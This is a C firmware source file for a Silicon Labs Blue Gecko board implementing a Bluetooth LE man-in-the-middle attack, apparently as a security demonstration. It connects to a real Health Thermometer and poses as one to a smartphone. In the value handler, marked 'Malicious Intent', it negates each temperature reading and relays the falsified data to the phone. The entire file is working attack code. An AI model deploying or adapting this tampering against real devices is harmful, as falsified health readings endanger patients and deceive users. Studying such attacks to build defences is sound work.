/***************************************************************************//**
 * @file app.c
 * @brief Silicon Labs MITM Example Project
 *
 * This example demonstrates the bare minimum needed for a Blue Gecko C application
 * that allows Over-the-Air Device Firmware Upgrading (OTA DFU). The application
 * starts advertising after boot and restarts advertising after a connection is closed.
 *******************************************************************************
 * # License
 * <b>Copyright 2018 Silicon Laboratories Inc. www.silabs.com</b>
 *******************************************************************************
 *
 * The licensor of this software is Silicon Laboratories Inc. Your use of this
 * software is governed by the terms of Silicon Labs Master Software License
 * Agreement (MSLA) available at
 * www.silabs.com/about-us/legal/master-software-license-agreement. This
 * software is distributed to you in Source Code format and is governed by the
 * sections of the MSLA applicable to Source Code.
 *
 ******************************************************************************/

/* Bluetooth stack headers */
#include "bg_types.h"
#include "native_gecko.h"
#include "gatt_db.h"

#include "app.h"
#include "em_core.h"

typedef enum {
  scanning,
  opening,
  discoverServices,
  discoverCharacteristics,
  enableIndication,
  running
} ConnState;

typedef struct {
  uint8_t  connectionHandle;
  int8_t   rssi;
  uint16_t address;
  uint32_t serviceHandle;
  uint16_t characteristicHandle;
  int32_t temperature;
} ConnProperties;

/* Print boot message */
static void bootMessage(struct gecko_msg_system_boot_evt_t *bootevt);

uint8_t findServiceInAdvertisement(uint8_t *data, uint8_t len);

/* Flag for indicating DFU Reset must be performed */
static uint8_t boot_to_dfu = 0;

// Health Thermometer service UUID defined by Bluetooth SIG
const uint8_t thermoService[2] = { 0x09, 0x18 };
// Temperature Measurement characteristic UUID defined by Bluetooth SIG
const uint8_t thermoCharacter[2] = { 0x1c, 0x2a };

ConnProperties healthThermoServer;
ConnProperties smartPhone;

// State of the connection under establishment
ConnState connState;

/* Main application */
void appMain(gecko_configuration_t *pconfig)
{
#if DISABLE_SLEEP > 0
  pconfig->sleep.flags = 0;
#endif

  /* Initialize debug prints. Note: debug prints are off by default. See DEBUG_LEVEL in app.h */
  initLog();

  /* Initialize stack */
  gecko_init(pconfig);

  while (1) {
    /* Event pointer for handling events */
    struct gecko_cmd_packet* evt;

    /* if there are no events pending then the next call to gecko_wait_event() may cause
     * device go to deep sleep. Make sure that debug prints are flushed before going to sleep */
    if (!gecko_event_pending()) {
      flushLog();
    }

    /* Check for stack event. This is a blocking event listener. If you want non-blocking please see UG136. */
    evt = gecko_wait_event();

    /* Handle events */
    switch (BGLIB_MSG_ID(evt->header)) {
      /* This boot event is generated when the system boots up after reset.
       * Do not call any stack commands before receiving the boot event.
       * Here the system is set to start advertising immediately after boot procedure. */
      case gecko_evt_system_boot_id:

        bootMessage(&(evt->data.evt_system_boot));
        printLog("boot event - starting advertising\r\n");

        /* Set active active scanning on 1Mb PHY.
         * Passive scanning to just listen to advertising packets.
         * May need to change it to active to send and received packets. */
        gecko_cmd_le_gap_set_discovery_type(le_gap_phy_1m, 0);

        /* Set scan interval and scan window. */
        gecko_cmd_le_gap_set_discovery_timing(le_gap_phy_1m, 160, 160);

        /* Start looking for Health Thermometers */
        gecko_cmd_le_gap_start_discovery(le_gap_phy_1m, le_gap_discover_generic);

        /* Set advertising parameters. 100ms advertisement interval.
         * The first parameter is advertising set handle
         * The next two parameters are minimum and maximum advertising interval, both in
         * units of (milliseconds * 1.6).
         * The last two parameters are duration and maxevents left as default. */
        gecko_cmd_le_gap_set_advertise_timing(0, 160, 160, 0, 0);

        /* Start general advertising and enable connections. */
        gecko_cmd_le_gap_start_advertising(0, le_gap_general_discoverable, le_gap_connectable_scannable);
        break;

      case gecko_evt_le_gap_scan_response_id:
        /* Check advertising packet type.
         * 0 is for connectable scannable undirected advertising. */
		if(evt->data.evt_le_gap_scan_response.packet_type == 0) {

		  /* Parse through advertisement packets
		   * If one of them is for a Health Thermometer, connect to that advertisement.
		   * If not, just keep waiting for next scan response. */
		  if(findServiceInAdvertisement(&(evt->data.evt_le_gap_scan_response.data.data[0]),
								 evt->data.evt_le_gap_scan_response.data.len) != 0){
			/* Temporarily stop scanning */
			gecko_cmd_le_gap_end_procedure();

			/* Connect to the server. */
			gecko_cmd_le_gap_connect(evt->data.evt_le_gap_scan_response.address,
									 evt->data.evt_le_gap_scan_response.address_type,
									 le_gap_phy_1m);

			/* Save address of healthThermoServer for debugging. */
			healthThermoServer.address = (uint16_t)(evt->data.evt_le_gap_scan_response.address.addr[1] << 8) \
										  + evt->data.evt_le_gap_scan_response.address.addr[0];

			// Debug
			printLog("Found advertising packet to real Health Thermometer Server!\r\n");
		  }
		}
		break;

      case gecko_evt_le_connection_opened_id:
      {
        /* Convert 8 bit 2 element array to 16 bit int */
        uint16_t connectedAddr = (uint16_t)(evt->data.evt_le_connection_opened.address.addr[1] << 8) \
                                  + evt->data.evt_le_connection_opened.address.addr[0];

        /* Check if MITM connected to server (Real Health Thermometer). */
        if(connectedAddr == healthThermoServer.address){
          /* Discover health thermometer server.*/
          gecko_cmd_gatt_discover_primary_services_by_uuid(evt->data.evt_le_connection_opened.connection,
                                                           2,
                                                           thermoService);
          healthThermoServer.connectionHandle = evt->data.evt_le_connection_opened.connection;
          printLog("%x\t", healthThermoServer.address);
          printLog("Connection opened to real Health Thermometer server\r\n");

          /* Device is discovering services.
           * Once the service is discovered, the procedure_complete event will be called.
           * Since there can be multiple tasks that can trigger the procedure_complete event,
           * this flag is to indicate that the procedure that was completed was the discover_service.
           * This is basically to implement a state machine:
           *    1. Find service
           *    2. Find characteristic
           *    3. Enable indication
           */
          connState = discoverServices;

        /* Check if smart phone connected to MITM. */
        }else{
          smartPhone.address = connectedAddr;
          smartPhone.connectionHandle = evt->data.evt_le_connection_opened.connection;
          printLog("%x\t", smartPhone.address);
          printLog("Connection opened to smart phone\r\n");
        }
        break;
      }

      case gecko_evt_le_connection_closed_id:

        printLog("connection closed, reason: 0x%2.2x\r\n", evt->data.evt_le_connection_closed.reason);

        /* Check if need to boot to OTA DFU mode */
        if (boot_to_dfu) {
          /* Enter to OTA DFU mode */
          gecko_cmd_system_reset(2);
        } else {
          /* Restart advertising after smart phone has disconnected */
          if(evt->data.evt_le_connection_closed.connection == smartPhone.connectionHandle) {
            gecko_cmd_le_gap_start_advertising(0, le_gap_general_discoverable, le_gap_connectable_scannable);
            printLog("Smart phone has disconnected\r\n");
          }

          /* Restart discovering after real Health Thermometer has disconnected */
          if(evt->data.evt_le_connection_closed.connection == healthThermoServer.connectionHandle) {
            gecko_cmd_le_gap_start_discovery(le_gap_phy_1m, 0);
            printLog("Real Health Thermometer server has disconnected\r\n");
          }
        }
        break;

      case gecko_evt_gatt_service_id:
        /* Check if newly discovered service is from the real Health Thermometer server. */
        if(evt->data.evt_gatt_service.connection == healthThermoServer.connectionHandle) {
          healthThermoServer.serviceHandle = evt->data.evt_gatt_service.service;
        }
        break;

      case gecko_evt_gatt_characteristic_id:
        /* Check if newly discovered characteristic is from the real Health Thermometer server. */
        if(evt->data.evt_gatt_characteristic.connection == healthThermoServer.connectionHandle) {
          healthThermoServer.characteristicHandle = evt->data.evt_gatt_characteristic.characteristic;
        }
        break;

      case gecko_evt_gatt_procedure_completed_id:
        /* State machine:
         *    1. Find services
         *    2. Find characteristics
         *    3. Enable Indication
         */

        /* Health Thermometer Service discovered. */
        if(connState == discoverServices) {
          /* Start discovering characteristic. */
          gecko_cmd_gatt_discover_characteristics_by_uuid(evt->data.evt_gatt_procedure_completed.connection,
                                                          healthThermoServer.serviceHandle,
                                                          2,
                                                          thermoCharacter);
          /* Go to next state */
          connState = discoverCharacteristics;
          break;
        }

        /* Temperature Measurement Characteristic discovered. */
        if(connState == discoverCharacteristics) {
          /* Stop discovering. */
          gecko_cmd_le_gap_end_procedure();

          /* Enable Indication because that's what the health thermo server has configured. */
          gecko_cmd_gatt_set_characteristic_notification(evt->data.evt_gatt_procedure_completed.connection,
                                                         healthThermoServer.characteristicHandle,
                                                         gatt_indication);
          /* Go to idle state */
          connState = running;
          break;
        }

        break;

      case gecko_evt_gatt_characteristic_value_id:
      {
        uint8_t maliciousData[5];

        /* Grab data and place record temperature value. */
        uint8_t *actualData = evt->data.evt_gatt_characteristic_value.value.data;
        smartPhone.temperature = (actualData[1] << 0) + (actualData[2] << 8) + (actualData[3] << 16);

        // Debug
        printLog("Actual Data: %2lu.%02lu\r\n", (smartPhone.temperature / 1000), ((smartPhone.temperature / 10) % 100));

        /* Malicious Intent: Change signs of temperature. */
        smartPhone.temperature = -smartPhone.temperature;

        /* Mask temperature back into char array to send to smartphone. */
        maliciousData[0] = actualData[0] & ~0x01; // Flags - Make units celcius
        maliciousData[1] = smartPhone.temperature & 0x00FF;
        maliciousData[2] = (smartPhone.temperature >> 8) & 0x00FF;
        maliciousData[3] = (smartPhone.temperature >> 16) & 0x00FF;
        maliciousData[4] = actualData[4];

        /* Indication requires confirmation that data has been received. */
        gecko_cmd_gatt_send_characteristic_confirmation(evt->data.evt_gatt_characteristic_value.connection);

        /* Indicate to smart phone. Send malicious data to smart phone. */
        gecko_cmd_gatt_server_send_characteristic_notification(smartPhone.connectionHandle,
                                                               gattdb_temperature_measurement,
                                                               5,
                                                               maliciousData);
        break;
      }

      /* Events related to OTA upgrading
         ----------------------------------------------------------------------------- */

      /* Check if the user-type OTA Control Characteristic was written.
       * If ota_control was written, boot the device into Device Firmware Upgrade (DFU) mode. */
      case gecko_evt_gatt_server_user_write_request_id:

        if (evt->data.evt_gatt_server_user_write_request.characteristic == gattdb_ota_control) {
          /* Set flag to enter to OTA mode */
          boot_to_dfu = 1;
          /* Send response to Write Request */
          gecko_cmd_gatt_server_send_user_write_response(
            evt->data.evt_gatt_server_user_write_request.connection,
            gattdb_ota_control,
            bg_err_success);

          /* Close connection to enter to DFU OTA mode */
          gecko_cmd_le_connection_close(evt->data.evt_gatt_server_user_write_request.connection);
        }
        break;

      /* Add additional event handlers as your application requires */

      default:
        break;
    }

    CORE_DECLARE_IRQ_STATE;
    CORE_ENTER_ATOMIC();
    gecko_sleep_for_ms(gecko_can_sleep_ms());
    CORE_EXIT_ATOMIC();
  }
}

/* Print stack version and local Bluetooth address as boot message */
static void bootMessage(struct gecko_msg_system_boot_evt_t *bootevt)
{
#if DEBUG_LEVEL
  bd_addr local_addr;
  int i;

  printLog("stack version: %u.%u.%u\r\n", bootevt->major, bootevt->minor, bootevt->patch);
  local_addr = gecko_cmd_system_get_bt_address()->address;

  printLog("local BT device address: ");
  for (i = 0; i < 5; i++) {
    printLog("%2.2x:", local_addr.addr[5 - i]);
  }
  printLog("%2.2x\r\n", local_addr.addr[0]);
#endif
}

// Parse advertisements looking for advertised Health Thermometer service
uint8_t findServiceInAdvertisement(uint8_t *data, uint8_t len)
{
  uint32_t adIdx = 0;
  while(adIdx < len) {
    /* The Advertising Data Packet is formatted where the first byte contains the length,
     * the second byte contains the type, and the rest is the data depending on length. */
    uint8_t adLength = data[adIdx];
    uint8_t adType = data[adIdx + 1];

    /* Check type. 0x02 for partial, 0x03 for complete. */
    if(adType == 0x02 || adType == 0x03) {

      /* Increment address by 2 so the adLength and adType in the packet format is not included. */
      if(memcmp(&(data[adIdx + 2]), thermoService, 2) == 0){
        return 1;
      }
    }

    /* Go to next packet which is adLength away. */
    adIdx = adIdx + adLength + 1;
  }
  return 0;
}
